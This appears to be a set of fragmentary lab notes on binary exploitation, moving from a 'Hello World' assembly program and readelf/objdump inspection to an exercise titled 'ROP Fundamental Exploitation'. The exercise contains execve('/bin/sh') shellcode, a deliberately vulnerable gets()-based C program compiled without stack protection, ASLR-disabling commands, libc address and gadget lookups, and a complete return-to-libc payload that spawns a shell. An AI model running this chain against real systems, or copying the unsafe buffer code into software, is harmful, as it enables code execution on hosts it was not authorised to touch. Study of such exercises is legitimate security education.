global _start

section .text

_start:   
    ; write(int fd, const void *buf, size_t count)    
    xor    eax,eax    
    xor    ebx,ebx    
    xor    ecx,ecx        
    xor    edx,edx    
    mov    al,0x4    
    inc    bl    
    push   0x000a2164    
    push   0x6c726f57    
    push   0x202c6f6c        
    push   0x6c6548    
    mov    ecx,esp    
    mov    dl,0xf    
    int    0x80
    
a. nasm -f elf32 -o code-one.o code-one.asm

b. ld -o code-one code-one.o

c. chmod +x code-one

d. ./code-one


for i in $(find / -executable -type f);do file -i $i | grep -i 'x-executable; charset=binary';done

a. readelf -S -W ~/examples/samplecode/info

b. readelf -p .text ~/examples/samplecode/info

c. readelf -x .text -W ~/examples/samplecode/info

------------


a. readelf -R .text -W ~/examples/samplecode/info

b. readelf -p .strtab -W ~/examples/samplecode/info

c. objdump -f ~/examples/samplecode/info

d. objdump -j .text -s ~/examples/samplecode/info

e. objdump -x ~/examples/samplecode/info

f. hexdump -C ~/examples/samplecode/info

---------------------   Exercise 8: ROP Fundamental Exploitation

int main() {
asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
        xor %rax, %rax\n\
        movb $0x3b, %al\n\
        xor %rsi, %rsi\n\
        xor %rdx, %rdx\n\
        syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
");
}

objdump -d ropshell | sed -n '/needle0/,/needle1/p'. 

. xxd -s0x4b8 -l40 -p ropshell shellcode



#include <stdio.h>
int main() {
char name[64];
printf("%p\n", name);  // Print address of buffer.
puts("What's your name?");
gets(name);
printf("Hello, %s!\n", name);
return 0;
}


gcc -o victim -fno-stack-protector victim.c.

 setarch `arch` -R ./victim
 
 a=\'printf %016x 0x7fffffffe1a0 | tac -rs..' 

 ((cat ropshell ; printf %080d 0 ; echo $a) | xxd -r -p ; cat ) | ./ropshell.
 
 
 objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret. 
 
 
 xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
 
 
 a. pid=`ps -C victim -o pid --no-headers | tr -d ' '`

b. grep libc /proc/$pid/maps


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
char cmd[64];
sprintf(cmd, "pmap %d", getpid());
system(cmd);
return 0;
}


40.-

a. libc=/lib/x86_64-linux-gnu/libc.so.6

b. base=0x$(setarch `arch` -R ./base | grep -m1 libc | cut -f1 -d' ')

c. echo …base at $base

d. system=0x$(nm -D $libc | grep '\<system>' | cut -f1 -d' ')

e. echo …system at $system

f. exit=0x$(nm -D $libc | grep '\<exit>' | cut -f1 -d' ')

g. echo …exit at $exit

h. gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')

i. echo …push-RDI gadget at $gadget


48. Enter nm -D /lib/ x86_64-linux-gnu/libc.so.6 | grep '\


addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
( (
echo  -n /bin/sh | xxd -p
printf %0130d 0
printf %016x $((base+gadget)) | tac -rs..
printf %016x $((addr)) | tac -rs..
printf %016x $((base+system)) | tac -rs..
printf %016x $((base+exit)) | tac -rs..
echo
) | xxd -r -p ; cat) | setarch `arch` -R ./victim
